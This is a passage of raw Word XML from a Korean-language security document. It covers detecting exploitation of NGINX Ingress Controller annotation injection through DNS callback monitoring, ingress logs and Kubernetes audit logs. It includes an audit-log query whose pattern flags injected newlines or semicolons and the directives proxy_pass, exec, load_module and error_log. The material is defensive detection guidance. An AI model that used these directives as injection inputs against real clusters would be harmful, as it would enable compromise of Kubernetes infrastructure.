          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>3. 비정상 DNS 쿼리 기반 탐지</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A98411" w14:textId="595B5A0A" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Google Cloud 등에서는 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>error_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> directive를 이용해 외부로 DNS 쿼리가 나가는지 모니터링하여, 실제 취약점 악용 여부를 비침습적으로 확인할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B33711" w14:textId="623514A1" w:rsidR="000D7E05" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="000D7E05">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Burp Collaborator, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Interactsh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 등 DNS callback 서비스를 활용해 악의적 annotation이 적용된 경우 발생하는 DNS 요청을 탐지할 수 있습니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33547984" w14:textId="373F3533" w:rsidR="000D7E05" w:rsidRPr="000D7E05" w:rsidRDefault="000D7E05" w:rsidP="000D7E05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D7E05">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">8.3 </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>분석</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이상</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>행위</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E27FA2" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>1. NGINX Ingress Controller 로그 모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14474292" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> logs &lt;nginx-ingress-pod&gt; -n ingress-nginx 명령으로 실시간 로그를 수집합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD190EA" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>로그에서 다음과 같은 패턴을 집중적으로 분석:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB12B7C" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>directive</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not allowed here"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDE2304" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>unexpected</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> directive"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF22AAA" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임시 NGINX 설정 파일 생성/검증(nginx -t) 관련 오류</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5BB046" w14:textId="599DF371" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그 레벨을 debug로 설정하면, Ingress 리소스 반영 및 NGINX 설정 생성 과정을 상세히 추적할 수 있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E863238" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2. Kubernetes Audit Log 활용</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D413814" w14:textId="2B59D53B" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>API 서버의 audit log를 활성화하여, Ingress 객체 생성/수정, admission controller 접근, Secrets 접근 시도 등 이상 행위를 기록합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1137C6" w14:textId="0C1F8EDD" w:rsidR="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시 쿼리</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31B879D2" wp14:editId="4C87AE73">
                <wp:extent cx="4976037" cy="1570355"/>
                <wp:effectExtent l="0" t="0" r="15240" b="10795"/>
                <wp:docPr id="201422362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6037" cy="157035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52212" w14:textId="2D469C18" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>sql</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="28E8F584" w14:textId="2D1BA3D8" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr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| filter </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"audit.k8s.io/v1"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  and verb in {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"create"</w:t>
                            </w:r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, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"update"</w:t>
                            </w:r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}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  and </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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objectRef</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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[resource] == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"ingresses"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  and annotations matches /[\n</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/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;]|</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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proxy_pass|</w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>exec</w:t>
                            </w:r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|load_module|error_log</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>)/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B879D2" id="_x0000_s1054" style="width:391.8pt;height:1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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7DB52212" w14:textId="2D469C18" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr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</w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r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  <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>sql</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="28E8F584" w14:textId="2D1BA3D8" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr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| filter </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"audit.k8s.io/v1"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  and verb in {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"create"</w:t>
                      </w:r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, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"update"</w:t>
                      </w:r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}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  and </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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objectRef</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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[resource] == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"ingresses"</w:t>
                      </w:r>
                      <w:r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 xml:space="preserve">  and annotations matches /[\n</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/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;]|</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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proxy_pass|</w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>exec</w:t>
                      </w:r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|load_module|error_log</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>)/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B7B7DE" w14:textId="15CBC642" w:rsidR="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">서비스 계정이 비정상적으로 Secrets, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ConfigMap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 등에 접근 시도하는 이벤트도 필터링하여 탐지합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4BE617" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>3. 외부 보안 플랫폼 및 통합 모니터링</w:t>
      </w:r>
    </w:p>
